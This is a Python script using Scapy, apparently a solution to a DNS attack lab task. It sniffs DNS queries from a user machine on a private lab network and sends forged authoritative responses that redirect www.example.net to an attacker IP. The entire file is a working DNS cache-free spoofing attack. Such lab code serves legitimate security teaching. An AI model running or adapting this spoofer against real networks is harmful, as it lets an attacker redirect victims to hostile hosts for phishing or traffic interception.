#!/usr/bin/env python3
"""
Task 5: Spoof DNS Response Directly to User
This script intercepts DNS queries from the user machine and sends fake responses.
"""

from scapy.all import *

# Configuration
DNS_SERVER_IP = "10.9.0.16"    # Local DNS server
USER_IP = "10.9.0.18"          # User machine
ATTACKER_IP = "10.9.0.17"      # Attacker machine
FAKE_IP = "10.9.0.17"          # Fake IP to return
TARGET_DOMAIN = "www.example.net"

def spoof_dns_response(pkt):
    """
    Intercept DNS query and send fake response directly to user
    """
    if DNS in pkt and pkt[DNS].qr == 0:  # DNS query
        query_name = pkt[DNS].qd.qname.decode('utf-8')

        if TARGET_DOMAIN in query_name:
            print(f"[+] Intercepted DNS query for: {query_name}")
            print(f"[+] Sending fake response with IP: {FAKE_IP}")

            # Create IP layer
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)

            # Create UDP layer
            udp = UDP(dport=pkt[UDP].sport, sport=53)

            # Create DNS response
            dns = DNS(
                id=pkt[DNS].id,
                qr=1,  # Response
                aa=1,  # Authoritative answer
                qd=pkt[DNS].qd,  # Same question
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=FAKE_IP)
            )

            # Send the spoofed response
            spoofed_pkt = ip/udp/dns
            send(spoofed_pkt, verbose=0)

            print(f"[+] Spoofed response sent!")
            print("-" * 60)

print("=" * 60)
print("Task 5: DNS Spoofing Attack - Direct Response to User")
print("=" * 60)
print(f"Target Domain: {TARGET_DOMAIN}")
print(f"Fake IP: {FAKE_IP}")
print(f"Listening for DNS queries from {USER_IP}...")
print("=" * 60)
print()

# Sniff DNS queries from user machine
sniff(filter=f"udp port 53 and src host {USER_IP}", prn=spoof_dns_response)
